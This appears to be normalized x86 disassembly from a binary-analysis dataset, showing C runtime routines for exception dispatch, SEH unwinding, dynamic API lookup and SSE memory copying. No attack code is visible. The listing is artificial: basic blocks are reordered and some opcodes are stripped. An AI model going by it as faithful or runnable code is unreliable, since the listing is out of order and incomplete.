lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push ebx
call sub_40b658
mov ecx [ ebp - 0x8 ]
add esp 0x14
mov edx [ ebp - 0x4 ]
cmp ecx edx
jae r-xdata
cmp [ edi ] 0xe0434f4d
je r-xdata
pop esi
pop ebx
lea esi [ eax + 0xc ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] 0xe0434352
je r-xdata
inc ecx
add esi 0x14
mov [ ebp - 0x8 ] ecx
cmp ecx edx
jb r-xdata
cmp eax [ esi - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_40b57b
add esp 0x1c
test eax eax
jne r-xdata
cmp eax [ esi - 0xc ]
jl r-xdata
mov eax [ esi ]
mov edi [ esi + 0x4 ]
shl eax 0x4
mov edi [ edi + eax - 0xc ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
add edi 0xfffffff0
add eax edi
mov edi [ ebp + 0x8 ]
test [ eax ] 0x40
jne r-xdata
mov edx [ esi + 0x4 ]
mov ebx [ edx + eax - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ ebx + 0x8 ] 0x0
mov ebx [ ebp + 0x18 ]
jne r-xdata
mov eax [ ebp + 0x1c ]
push 0x1
push [ ebp + 0x24 ]
lea ecx [ esi - 0xc ]
push [ ebp + 0x20 ]
push ecx
push 0x0
push eax
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_40cb0f
mov edx [ ebp - 0x4 ]
add esp 0x2c
mov ecx [ ebp - 0x8 ]
sub_40d04d
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
call sub_411d97
mov edi [ esi ]
xor ebx ebx
test edi edi
jle r-xdata
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov [ ebp - 0x4 ] ebx
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ecx [ eax ]
add eax 0x4
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
add edx 0x10
mov [ ebp - 0x4 ] edx
sub edi 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
add eax edx
mov [ ebp - 0x14 ] eax
mov ecx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
mov bl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
dec eax
add ecx 0x4
mov [ ebp - 0x8 ] eax
test eax eax
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x14 ]
jg r-xdata
mov edx [ ebp + 0x8 ]
push [ edx + 0x1c ]
push [ ecx ]
push eax
call sub_40d521
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub_40d0e9
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp [ edi ] esi
jle r-xdata
xor al al
mov ebx esi
mov al 0x1
jmp r-xdata
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi + 0x4 ]
push rw-data
mov eax [ ebx + eax + 0x4 ]
add eax 0x4
push eax
call sub_40c6cc
pop ecx
pop ecx
test eax eax
je r-xdata
sub_40d12f
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov eax [ ecx ]
mov esi [ ecx + 0x4 ]
add eax edx
test esi esi
js r-xdata
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ esi + edx ]
mov ecx [ edx + ecx ]
add ecx esi
add eax ecx
sub_40d154
push 0x8
push r--data
call sub_40b2f0
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test [ edx ] 0x80000000
je r-xdata
lea edi [ ecx + 0xc ]
add edi [ edx + 0x8 ]
mov edi ecx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40d12f
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40d128
sub eax 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push edx
push ecx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_40d1e6
add esp 0x10
sub eax 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b336
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40d12f
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40d128
jmp r-xdata
sub_40d1e6
push 0x10
push r--data
call sub_40b2f0
xor ebx ebx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] bl
je r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ eax ]
mov esi [ ebp + 0xc ]
test ecx ecx
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] ebx
mov edi [ ebp + 0x14 ]
test cl cl
jns r-xdata
add esi 0xc
add esi edx
mov eax [ ebp + 0x8 ]
test cl 0x8
je r-xdata
test [ edi ] 0x10
je r-xdata
test [ edi ] 0x1
je r-xdata
mov ecx [ eax + 0x18 ]
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
cmp [ edi + 0x18 ] ebx
jne r-xdata
cmp [ eax + 0x18 ] 0x0
je r-xdata
call sub_411d97
test esi esi
je r-xdata
mov ecx eax
call j_sub_40c250
call [ ebp - 0x1c ]
mov ecx eax
jmp r-xdata
cmp [ eax + 0x18 ] ebx
je r-xdata
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
test esi esi
je r-xdata
mov [ esi ] ecx
lea eax [ edi + 0x8 ]
push eax
push ecx
jmp r-xdata
test ecx ecx
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
push [ edi + 0x14 ]
push [ eax + 0x18 ]
push esi
call sub_40dcd0
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
call sub_40d12f
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
test [ edi ] 0x4
push 0x0
pop ebx
setne bl
inc ebx
mov [ ebp - 0x20 ] ebx
push [ edi + 0x14 ]
lea eax [ edi + 0x8 ]
push eax
push ecx
call sub_40d12f
pop ecx
pop ecx
push eax
push esi
call sub_40dcd0
add esp 0xc
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax ebx
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
call sub_40b336
retn
lea eax [ edi + 0x8 ]
push eax
push [ esi ]
sub_40d318
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe0434352
je r-xdata
call sub_40c724
cmp [ eax + 0x18 ] 0x0
jle r-xdata
cmp [ eax ] 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_40c724
dec [ eax + 0x18 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
call sub_40c724
and [ eax + 0x18 ] 0x0
jmp sub_411d97
sub_40d35d
push 0x10
push r--data
call sub_40b2f0
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x4 ] 0x80
mov eax [ ebp + 0x8 ]
jg r-xdata
mov esi [ eax + 0x8 ]
movsx esi [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d411
cmp esi [ ebp + 0x14 ]
jne r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_40c724
inc [ eax + 0x18 ]
and [ ebp - 0x4 ] 0x0
call sub_411d97
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] esi
call sub_40b336
retn
mov ecx [ ebp + 0x10 ]
cmp esi [ ecx + 0x4 ]
jge r-xdata
mov eax [ ecx + 0x8 ]
mov edx [ eax + esi * 8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x1
cmp [ eax + esi * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
push 0x103
push eax
mov eax [ ecx + 0x8 ]
push [ eax + esi * 8 + 0x4 ]
call sub_40c800
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_40d425
push ebp
mov ebp esp
push ebx
push esi
push edi
push [ ebp + 0x10 ]
call sub_40c250
pop ecx
call sub_40c724
mov ecx [ ebp + 0x18 ]
xor esi esi
mov edx [ ebp + 0x8 ]
mov ebx 0x1fffffff
mov edi 0x19930522
cmp [ eax + 0x20 ] esi
jne r-xdata
test [ edx + 0x4 ] 0x66
je r-xdata
cmp [ edx ] 0xe06d7363
je r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
cmp [ edx ] 0x80000026
je r-xdata
cmp [ edx ] 0xe06d7363
jne r-xdata
mov eax [ ecx ]
and eax ebx
cmp eax 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] esi
jne r-xdata
mov eax [ ecx ]
and eax ebx
cmp eax edi
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_40cbd4
add esp 0x20
cmp [ edx + 0x10 ] 0x3
jb r-xdata
cmp eax edi
jb r-xdata
cmp [ ecx + 0x1c ] esi
jne r-xdata
push 0xffffffff
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40d35d
add esp 0x10
jmp r-xdata
test [ ecx + 0x20 ] 0x1
jne r-xdata
cmp [ edx + 0x14 ] edi
jbe r-xdata
test [ ecx + 0x20 ] 0x4
je r-xdata
mov eax [ edx + 0x1c ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
movzx eax [ ebp + 0x24 ]
push eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ecx
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call j_sub_40c250
call esi
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40d521
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov eax [ edx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea ecx [ eax + 0x8 ]
cmp [ ecx ] 0x0
je r-xdata
test [ edx ] 0x80
mov edi [ ebp + 0xc ]
je r-xdata
mov ebx [ edi + 0x4 ]
xor esi esi
cmp eax ebx
je r-xdata
test [ edi ] 0x10
jne r-xdata
test [ edi ] 0x2
je r-xdata
lea eax [ ebx + 0x8 ]
mov eax [ ebp + 0x10 ]
test [ eax ] 0x1
je r-xdata
test [ edx ] 0x8
je r-xdata
sbb eax eax
or eax 0x1
test bl bl
je r-xdata
test [ eax ] 0x2
je r-xdata
test [ edx ] 0x1
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax esi
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ eax + 0x1 ]
jne r-xdata
xor esi esi
inc esi
test [ edx ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test eax eax
je r-xdata
add ecx 0x2
add eax 0x2
test bl bl
jne r-xdata
mov bl [ ecx ]
cmp bl [ eax ]
jne r-xdata
sub_40d5cc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
push esi
push edi
lea ebx [ eax * 4 + rw-data ]
xor eax eax
[ ebx ] ecx
mov edx [ rw-data ]
or edi 0xffffffff
mov ecx edx
mov esi edx
and ecx 0x1f
xor esi eax
ror esi cl
cmp esi edi
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov esi [ ebp + 0x10 ]
cmp esi [ ebp + 0x14 ]
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
push [ esi ]
call sub_40d66c
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax edx
push 0x20
and eax 0x1f
pop ecx
sub ecx eax
ror edi cl
xor edi edx
xchg [ ebx ] edi
push [ ebp + 0xc ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
add esi 0x4
cmp esi [ ebp + 0x14 ]
jne r-xdata
mov edx [ rw-data ]
push esi
call sub_40d5af
pop ecx
xchg [ ebx ] eax
jmp r-xdata
test eax eax
je r-xdata
mov edx [ rw-data ]
sub_40d66c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
xor ecx ecx
push edi
xor eax eax
lea edi [ ebx * 4 + rw-data ]
[ edi ] ecx
mov ecx eax
test ecx ecx
je r-xdata
mov ebx [ ebx * 4 + r--data ]
push esi
push 0x800
push 0x0
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
neg eax
sbb eax eax
and eax ecx
jmp r-xdata
mov eax esi
xchg [ edi ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
pop edi
pop ebx
pop ebp
retn
mov eax esi
push esi
call [ FreeLibrary@IAT ]
xor esi esi
push esi
push esi
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
jmp r-xdata
or eax 0xffffffff
xchg [ edi ] eax
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
pop esi
sub_40d6ed
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x0
call sub_40d5cc
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40c250
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_40d72d
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x1
call sub_40d5cc
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0x18 ]
mov ecx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40c250
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_40d770
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x2
call sub_40d5cc
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call j_sub_40c250
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_40d7aa
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x3
call sub_40d5cc
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0x20 ]
mov ecx esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40c250
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_40d7f3
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x4
call sub_40d5cc
mov esi eax
add esp 0x10
test esi esi
je r-xdata
pop esi
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call j_sub_40c250
call esi
pop esi
pop ebp
retn
sub_40d82d
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x5
call sub_40d5cc
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsFree@IAT ]
mov ecx esi
call j_sub_40c250
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_40d867
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x6
call sub_40d5cc
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsGetValue@IAT ]
mov ecx esi
call j_sub_40c250
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_40d8a1
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x7
call sub_40d5cc
add esp 0x10
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsSetValue@IAT ]
mov ecx esi
call j_sub_40c250
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_40d8de
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x8
call sub_40d5cc
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40c250
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_40d924
mov eax [ rw-data ]
push edi
push 0x20
and eax 0x1f
mov edi rw-data
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
push 0x9
pop ecx
[ edi ]
pop edi
retn
sub_40d948
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push esi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jne r-xdata
cmp [ esi ] 0xffffffff
je r-xdata
cmp [ esi ] 0x0
je r-xdata
pop esi
and [ esi ] 0x0
push [ esi ]
call [ FreeLibrary@IAT ]
sub_40d980
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_40da10
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_40dc85
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_40dca4
jmp r-xdata
sub_40da10
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40a8ab
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_40d980
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40da56
push ebp
push [ esp + 0x8 ]
call sub_40c250
add esp 0x4
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_40d980
add esp 0xc
pop ebp
retn 0x4
sub_40da7e
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_40daae
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40dade
push esi
push edi
mov edi rw-data
xor esi esi
call sub_40db1a
xor al al
inc [ rw-data ]
add esi 0x18
add edi 0x18
cmp esi 0x18
jb r-xdata
push 0x0
push 0xfa0
push edi
call sub_40d8de
add esp 0xc
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_40db1a
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov al 0x1
pop esi
retn
imul eax esi 0x18
push edi
lea edi [ eax + rw-data ]
push edi
call [ DeleteCriticalSection@IAT ]
dec [ rw-data ]
sub edi 0x18
sub esi 0x1
jne r-xdata
pop edi
sub_40db70
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40db90
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40a8ab
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_40dbd5
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40dbd5
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_40db90
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40dc85
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40dca4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_40dc7c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_40dc85
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_40dcd0
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x20
jb r-xdata
cmp edi eax
jb r-xdata
and ecx 0x1f
je r-xdata
cmp ecx 0x80
jae r-xdata
lea esi [ ecx + esi ]
lea edi [ ecx + edi ]
cmp ecx 0x20
jb r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax ecx
shr ecx 0x2
je r-xdata
bt [ rw-data ] 0x1
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
test ecx 0xfffffffc
je r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
add edi 0x4
add esi 0x4
sub ecx 0x1
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
[ edi ] [ esi ]
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test ecx ecx
je r-xdata
jmp r-xdata
test ecx ecx
je r-xdata
sub edi 0x4
sub esi 0x4
mov eax [ esi ]
mov [ edi ] eax
sub ecx 0x4
test ecx 0xfffffffc
jne r-xdata
test edi 0xf
je r-xdata
test edi 0x3
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov edx ecx
shr edx 0x5
test edx edx
je r-xdata
test edi 0x3
je r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
sub edi 0x1
sub esi 0x1
mov al [ esi ]
mov [ edi ] al
sub ecx 0x1
jne r-xdata
cmp ecx 0x80
jb r-xdata
dec ecx
dec esi
dec edi
mov al [ esi ]
mov [ edi ] al
test edi 0xf
jne r-xdata
cmp ecx 0x20
jb r-xdata
mov edx edi
and edx 0x3
sub ecx edx
lea esp [ esp ]
lea ecx [ ecx ]
test edi 0x3
jne r-xdata
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
lea ebx [ ebx ]
mov edx ecx
cmp ecx 0x20
jb r-xdata
mov al [ esi ]
mov [ edi ] al
dec ecx
add esi 0x1
add edi 0x1
test edi 0x3
jne r-xdata
cmp ecx 0x20
jb r-xdata
sub esi 0x80
sub edi 0x80
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu xmm2 [ esi + 0x20 ]
movdqu xmm3 [ esi + 0x30 ]
movdqu xmm4 [ esi + 0x40 ]
movdqu xmm5 [ esi + 0x50 ]
movdqu xmm6 [ esi + 0x60 ]
movdqu xmm7 [ esi + 0x70 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
movdqu [ edi + 0x20 ] xmm2
movdqu [ edi + 0x30 ] xmm3
movdqu [ edi + 0x40 ] xmm4
movdqu [ edi + 0x50 ] xmm5
movdqu [ edi + 0x60 ] xmm6
movdqu [ edi + 0x70 ] xmm7
sub ecx 0x80
test ecx 0xffffff80
jne r-xdata
mov edx ecx
shr ecx 0x2
and edx 0x3
sub esi 0x4
sub edi 0x4
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + r-xdata ]
mov al [ esi - 0x1 ]
mov [ edi - 0x1 ] al
dec esi
dec edi
sub edx 0x1
jne r-xdata
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
lea esi [ esi + 0x20 ]
lea edi [ edi + 0x20 ]
dec edx
jne r-xdata
shr ecx 0x2
[ edi ] [ esi ]
and edx 0x3
jmp [ edx * 4 + r-xdata ]
sub esi 0x20
sub edi 0x20
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
sub ecx 0x20
test ecx 0xffffffe0
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
lea esp [ esp ]
mov edi edi
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
